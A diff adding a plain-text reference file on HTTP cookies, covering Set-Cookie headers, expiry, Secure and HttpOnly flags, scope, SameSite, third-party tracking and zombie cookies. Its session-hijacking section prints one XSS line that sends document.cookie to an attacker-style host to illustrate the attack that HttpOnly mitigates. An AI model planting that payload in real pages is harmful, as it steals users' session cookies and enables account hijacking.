@@ -1,0 +1,121 @@
+An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends
+    to the user's web browser. The browser may store it and send it back with the next
+    request to the same server. Typically, it's used to tell if two requests came from
+    the same browser — keeping a user logged-in, for example. It remembers stateful
+    information for the stateless HTTP protocol.
+
+Cookies are mainly used for three purposes:
+    * Session management
+        Logins, shopping carts, game scores, or anything else the server should remember.
+    * Personalization
+        User preferences, themes, and other settings.
+    * Tracking
+        Recording and analyzing user behavior.
+
+Cookies are sent with every request, so they can worsen performance
+    (especially for mobile data connections).
+Modern APIs for client storage are the Web storage API
+    (localStorage and sessionStorage) and IndexedDB.
+
+* Creating cookies
+    When receiving an HTTP request, a server can send a Set-Cookie header with the response.
+    The cookie is usually stored by the browser, and then the cookie is sent with requests
+    made to the same server inside a Cookie HTTP header. An expiration date or duration can
+    be specified, after which the cookie is no longer sent.
+
+* The Set-Cookie and Cookie headers
+    The Set-Cookie HTTP response header sends cookies from the server to the user agent.
+    A simple cookie is set like this:
+        Set-Cookie: <cookie-name>=<cookie-value>
+    Now, with every new request to the server, the browser will send back all previously
+    stored cookies to the server using the Cookie header.
+        GET /sample_page.html HTTP/1.1
+        Host: www.example.org
+        Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+    
+* Session cookies
+    The cookie created above is a session cookie: it is deleted when the client shuts down,
+    because it didn't specify an Expires or Max-Age directive. However, web browsers may
+    use session restoring, which makes most session cookies permanent, as if the browser
+    was never closed.
+
+* Permanent cookies
+    Instead of expiring when the client closes, permanent cookies expire at a specific
+    date (Expires) or after a specific length of time (Max-Age).
+        Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+    ! Note: When an expiry date is set, the time and date set is relative to the client
+    the cookie is being set on, not the server.
+
+* Secure and HttpOnly cookies
+    A secure cookie is only sent to the server with a encrypted request over the HTTPS
+    protocol. Even with Secure, sensitive information should never be stored in cookies,
+    as they are inherently insecure and this flag can't offer real protection. Starting
+    with Chrome 52 and Firefox 52, insecure sites (http:) can't set cookies with
+    the Secure directive.
+    To prevent cross-site scripting (XSS) attacks, HttpOnly cookies are inaccessible
+    to JavaScript's Document.cookie API; they are only sent to the server. For example,
+    cookies that persist server-side sessions don't need to be available to JavaScript,
+    and the HttpOnly flag should be set.
+        Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+
+* Scope of cookies
+    The Domain and Path directives define the scope of the cookie: what URLs the
+    cookies should be sent to.
+    Domain specifies allowed hosts to receive the cookie. If unspecified, it
+    defaults to the host of the current document location, excluding subdomains.
+    If Domain is specified, then subdomains are always included.
+    For example, if Domain=mozilla.org is set, then cookies are included on
+    subdomains like developer.mozilla.org.
+    Path indicates a URL path that must exist in the requested URL in order to
+    send the Cookie header. The %x2F ("/") character is considered a directory
+    separator, and subdirectories will match as well.
+    For example, if Path=/docs is set, these paths will match:
+        /docs
+        /docs/Web/
+        /docs/Web/HTTP
+
+* SameSite cookies 
+    SameSite cookies let servers require that a cookie shouldn't be sent with cross-site
+    requests, which somewhat protects against cross-site request forgery attacks (CSRF).
+    SameSite cookies are still experimental and not yet supported by all browsers.
+
+* JavaScript access using Document.cookie
+    New cookies can also be created via JavaScript using the Document.cookie property,
+    and if the HttpOnly flag is not set, existing cookies can be accessed from
+    JavaScript as well.
+        document.cookie = "yummy_cookie=choco";
+        document.cookie = "tasty_cookie=strawberry";
+        console.log(document.cookie);
+        // logs "yummy_cookie=choco; tasty_cookie=strawberry"
+    
+* Session hijacking and XSS
+    Cookies are often used in web application to identify a user and their authenticated
+    session, so stealing a cookie can lead to hijacking the authenticated user's session.
+    Common ways to steal cookies include Social Engineering or exploiting an XSS
+    vulnerability in the application.
+        (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+    The HttpOnly cookie attribute can help to mitigate this attack by preventing access
+    to cookie value through JavaScript.
+
+* Tracking and privacy
+    Third-party cookies
+        Cookies have a domain associated to them. If this domain is the same as the domain
+        of the page you are on, the cookies is said to be a first-party cookie. If the
+        domain is different, it is said to be a third-party cookie. While first-party
+        cookies are sent only to the server setting them, a web page may contain images
+        or other components stored on servers in other domains (like ad banners).
+        Cookies that are sent through these third-party components are called third-party
+        cookies and are mainly used for advertising and tracking across the web.
+    Do-Not-Track
+        There are no legal or technological requirements for its use, but the DNT header
+        can be used to signal that a web application should disable either its tracking
+        or cross-site user tracking of an individual user.
+
+* Zombie cookies and Evercookies
+    A more radical approach to cookies are zombie cookies or "Evercookies" which are
+    recreated after their deletion and are intentionally hard to delete forever.
+    They are using the Web storage API, Flash Local Shared Objects and other
+    techniques to recreate themselves whenever the cookie's absence is detected.
+
+
+
